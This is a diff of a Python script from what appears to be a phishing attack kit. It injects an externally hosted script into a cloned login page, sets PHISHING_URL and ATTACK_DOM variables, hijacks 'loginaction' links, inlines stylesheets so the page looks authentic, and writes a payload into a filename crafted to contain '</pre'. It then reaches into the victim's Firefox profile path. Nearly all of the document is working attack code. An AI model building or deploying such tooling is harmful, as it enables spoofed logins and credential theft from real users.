@@ -1,5 +1,6 @@
 import os 
 from bs4 import BeautifulSoup as bs
+import bs4
 import sys
 
 prefix = "./client/public/"
@@ -55,32 +56,60 @@ if not index.endswith(".html"):
 
 print("Patching index file: " + prefix + "entry-site/" + index)
 with open(prefix + "entry-site/" + index, "r+") as index_file:
+
+	# insert the patch into <body onload=
 	patch_js = ""
 	with open(prefix + "../patch.js", "r") as patch_file:
 		patch_js = patch_file.read()
-	html = index_file.read()
-	soup = bs(html, "html.parser")
-	soup.body["onload"] = "var ORIG_DOM='{}';\
+	patch_js = "var ORIG_DOM='{}';\
 		var FINAL_DOM='{}';\
 		var DOMAIN='https://{}';\
 		var PHISHING_URL='{}';\
 		{}".format(entry_url, exit_url, domain, phishing_url, patch_js)
+	with open(prefix + "compiled-patch.js", "w") as patch_file:
+		patch_file.write(patch_js)
+	
+	# insert script to compiled patch
+	html = index_file.read()
+	soup = bs(html, "html.parser")
+	s = soup.new_tag("script")
+	s["src"] = "https://" + domain + "/compiled-patch.js";
+	soup.body.insert(0, s);
+
+	# make links clickable 
 	for link in soup.find_all('a'):
 		if "href" in link.attrs.keys() and "loginaction" in link["href"]:
 			del link["href"]
 			link["onclick"] = "window.nextWin()"
 			link["style"] = "cursor:pointer"
-	#html = html.replace("<body", '<body onload="' + patch_js + '"')
+
+	# replace stylesheets into single file for simulating browser load in order
+	stylesheets = soup.findAll("link", {"rel": "stylesheet"})
+	for s in stylesheets:
+		t = soup.new_tag('style')
+		with open(prefix + "entry-site/" + s["href"], "r") as css_file:
+			c = bs4.element.NavigableString(css_file.read())
+			t.insert(0,c)
+			t['type'] = 'text/css'
+			s.replaceWith(t)
+
+	# write patched html 
 	index_file.seek(0, os.SEEK_SET)
 	index_file.write(str(soup))
 
 with open(prefix + "../payload.js", "r") as payload_template_file:
 	payload = payload_template_file.read()
 	attack_url = "https://" + domain + "/entry-site/" + index
-	payload = "var ATTACK_DOM='{}';var ORIG_DOM='{}' {}".format(attack_url, entry_url, payload) 
+	payload = "window.ATTACK_DOM='{}';\
+			window.ORIG_DOM='{}';\
+			window.PHISHING_URL='{}';\
+			window.FINAL_DOM='{}';\
+			{}".format(attack_url, entry_url, phishing_url, exit_url, payload) 
 	os.system("mkdir -p " + prefix + "\\'\\<")
 	with open(prefix + "'</pre", "w") as payload_file:
 		payload_file.write(payload)	
+
+open("output.html", "w").write(str(soup))
 
 firefox_path = os.path.join(os.environ['HOME'], ".mozilla/firefox")
 if len(sys.argv) == 6: firefox_path = sys.argv[5]
